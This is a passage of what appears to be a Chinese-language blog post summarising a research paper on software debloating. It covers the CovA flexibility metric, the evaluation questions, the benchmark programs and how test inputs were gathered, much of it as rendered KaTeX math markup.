reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">}</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">}</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">}</span></span></span></span></eq>,其中<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>s</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>s</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>s</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">s_0,s_1,s_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>是三个语句.此时<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mo stretchy="false">(</mo><mi>f</mi><mo separator="true">,</mo><mi>I</mi><mo stretchy="false">)</mo><mo>=</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">c(f,I)=2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span></span></span></span></eq>,因为有两个唯一的语句集合,即<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">{</mo><msub><mi>s</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>s</mi><mn>1</mn></msub><mo stretchy="false">}</mo><mo separator="true">,</mo><mo stretchy="false">{</mo><msub><mi>s</mi><mn>0</mn></msub><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\{s_0,s_1\},\{s_0\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">}</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">{</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">}</span></span></span></span></eq></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>o</mi><mi>v</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">CovA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">A</span></span></span></span></eq>计算<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi></mrow><annotation encoding="application/x-tex">f</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span></span></span></span></eq>的灵活性<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mi>l</mi><mi>e</mi><mi>x</mi></mrow><annotation encoding="application/x-tex">flex</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span></span></span></span></eq>公式:<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mi>l</mi><mi>e</mi><mi>x</mi><mo stretchy="false">(</mo><mi>f</mi><mo separator="true">,</mo><mi>I</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mrow><mi>c</mi><mo stretchy="false">(</mo><mi>f</mi><mo separator="true">,</mo><mi>I</mi><mo stretchy="false">)</mo></mrow><msub><mi>N</mi><mi>I</mi></msub></mfrac></mrow><annotation encoding="application/x-tex">flex(f,I)=\frac{c(f,I)}{N_I}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.4553em;vertical-align:-0.4453em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.01em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3567em;margin-left:-0.109em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.07847em;">I</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1433em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">c</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.07847em;">I</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4453em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></eq> 其中<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>N</mi><mi>I</mi></msub></mrow><annotation encoding="application/x-tex">N_I</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.07847em;">I</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>是<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi></mrow><annotation encoding="application/x-tex">I</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span></span></span></span></eq>中输入的数量;</li><li>使用机理:对于低 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mi>l</mi><mi>e</mi><mi>x</mi><mi>i</mi><mi>b</mi><mi>i</mi><mi>l</mi><mi>i</mi><mi>t</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">flexibility</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">ibi</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span></eq>的函数,他在执行未被观察到的输入时,其行为可能会发生变化的概率较小,因此<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>o</mi><mi>v</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">CovA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">A</span></span></span></span></eq>认为这些函数增强的优先级较低</li></ul></li></ul></li></ul><h3 id="04-%E8%AF%84%E4%BC%B0" tabindex="-1">04 评估</h3><ul><li>探究以下四个问题<br>• RQ1：就减少程度、c-普适性和它们之间的权衡而言，所考虑的方法有何区别？<br>• RQ2：就减少程度、r-普适性和它们之间的权衡而言，所考虑的方法有何区别？<br>• RQ3：当使用越来越多的输入进行精简时，所考虑的方法的表现如何？<br>• RQ4：这些方法的效率如何？</li></ul><h4 id="4.1-%E5%B7%A5%E5%85%B7%E5%AE%9E%E7%8E%B0" tabindex="-1">4.1 工具实现</h4><ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>H</mi><mi>I</mi><mi>S</mi><mi>E</mi><mi>L</mi><mo separator="true">,</mo><mi>D</mi><mi>E</mi><mi>B</mi><mi>O</mi><mi>P</mi><mo separator="true">,</mo><mi>R</mi><mi>A</mi><mi>Z</mi><mi>O</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">CHISEL,DEBOP,RAZOR</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.05764em;">SE</span><span class="mord mathnormal">L</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.13889em;">EBOP</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.00773em;">ZOR</span></span></span></span></eq></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>o</mi><mi>v</mi><mi>F</mi><mo separator="true">,</mo><mi>C</mi><mi>o</mi><mi>v</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">CovF,CovA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">A</span></span></span></span></eq></li></ul><h4 id="4.2-%E5%9F%BA%E5%87%86(benchmarks)" tabindex="-1">4.2 基准(Benchmarks)</h4><h5 id="4.2.1-%E5%9F%BA%E5%87%86%E7%A8%8B%E5%BA%8F" tabindex="-1">4.2.1 基准程序</h5><ul><li><p>在我们的评估中，我们使用了两组程序：十个实用程序（Util）和来自SIR基准[2]的15个程序（SIR）。</p><ul><li>这十个实用程序，因为它们在之前的精简方法CHISEL,DEBOP,RAZOR的评估中使用过。对于这些程序，我们使用了它们在Chisel基准[20]中提供的单文件版本。一个单文件程序包含一个C文件，将项目中所有原始C源文件合并在一起。</li><li>一组15个程序，它们是SIR基准提供的所有C程序。它们代表了不同类型的程序，包括词法分析器（printtokens）、实用程序（例如make）、Unix shell（bash）和文本编辑器（vim）。我们选择这些基准程序也是因为它们有大量（从几百到几千个）相关的测试。拥有大量的测试能够有效评估精简程序的普适性，并对使用不断增加的输入进行精简的效果进行全面调查。对于SIR程序，我们使用CIL合并工具[1]为它们获取了用于精简的单文件版本。</li></ul></li><li><p>下表表示了25个程序的基准:</p><ul><li>从属 belong (Bench)</li><li>名字 name (Program)</li><li>代码行数 size in lines of code (LOC)</li><li>函数数量 number of functions (#Func)</li><li>语句数量  statements (#Stmt)</li></ul></li><li><p>SIR基准包含七个程序(SSIR),比另外八个小(LSIR),我们应该重点分析方法在使用程序和大型程序上的效果,因为去膨胀技术更适用于大程序</p></li></ul><p><img src="/images/%E8%AE%BA%E6%96%87/%5Csoftware%20debloating%20%E8%AE%BA%E6%96%87/(1)_1_1.png" alt></p><h5 id="4.2.2-%E8%BE%93%E5%85%A5" tabindex="-1">4.2.2 输入</h5><ul><li><p>在对程序进行去膨胀和通用性评估时,由于需要大量的输入,所以没有使用与程序关联的人为创建的小的数据集,而是通过谷歌搜索,在网络上获得真实用户的输入</p></li><li><p>实用工具输入</p><ul><li>具体而言,我们为每个实用工具收集十个输入集,均来自真实用户,网站来源见引用</li><li>下1介绍了输入的统计信息，包括#TotalIn（总输入数）、#MinIn（所有输入集中最小输入数的集合𝑆𝑚𝑖𝑛）、#MaxIn（所有输入集中最大输入数的集合𝑆𝑚𝑎𝑥）和#AvgIn（所有输入集的平均输入数）,程序的总输入数（#TotalIn）</li></ul></li><li><p>SIR程序输入</p><ul><li>我们将与程序相关的输入集<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>I</mi><mi>u</mi></msub></mrow><annotation encoding="application/x-tex">I_u</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">u</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>分为两个子集<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>I</mi><mi>d</mi></msub></mrow><annotation encoding="application/x-tex">I_d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">d</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>和<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>I</mi><mi>e</mi></msub></mrow><annotation encoding="application/x-tex">I_e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>,用于评估去简化效果和正确性</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>I</mi><mi>d</mi></msub></mrow><annotation encoding="application/x-tex">I_d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">d</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>:从<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>I</mi><mi>u</mi></msub></mrow><annotation encoding="application/x-tex">I_u</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">u</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>中随机选择10个输入,使其大小约等于实用工具输入的数量</li><li>额外的三个<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>I</mi><mi>d</mi></msub></mrow><annotation encoding="application/x-tex">I_d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">d</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>:分别占<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>I</mi><mi>u</mi></msub></mrow><annotation encoding="application/x-tex">I_u</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">u</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>的<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>10</mn><mi mathvariant="normal">%</mi><mo separator="true">,</mo><mn>20</mn><mi mathvariant="normal">%</mi><mo separator="true">,</mo><mn>30</mn><mi mathvariant="normal">%</mi></mrow><annotation encoding="application/x-tex">10\%,20\%,30\%</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9444em;vertical-align:-0.1944em;"></span><span class="mord">10%</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">20%</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">30%</span></span></span></span></eq>,并获得相应的<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>I</mi><mi>e</mi></msub></mrow><annotation encoding="application/x-tex">I_e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>集合,以评估输入大小与简化效果之间的关系</li></ul></li><li><p>为了评估基于相关输入的通用性，我们针对不同的程序使用了不同的方法来识别相关输入。</p><ul><li>对于接受带选项的命令行输入的程序（例如bzip2），如果它们使用相同的选项集，我们认为两个输入是相关的，这种方法类似于Razor [49]的评估中所使用的方法。</li><li>对于bash和vim，提供的输入已经使用标签标记了它们所使用的功能（例如，算术功能的标签为“arith”）。因此，对于这些输入，我们使用标签来确定它们之间的相关性。</li><li>对于所有其他程序，即SSIR程序，我们认为所有输入都是相关的。</li></ul></li><li><p>为了评估鲁棒性,我们使用了Radamsa [53]和AFL [4]基于去除冗余代码的输入来生成一组模糊输入<eq><span class="katex"><span class="katex-mathml"><math 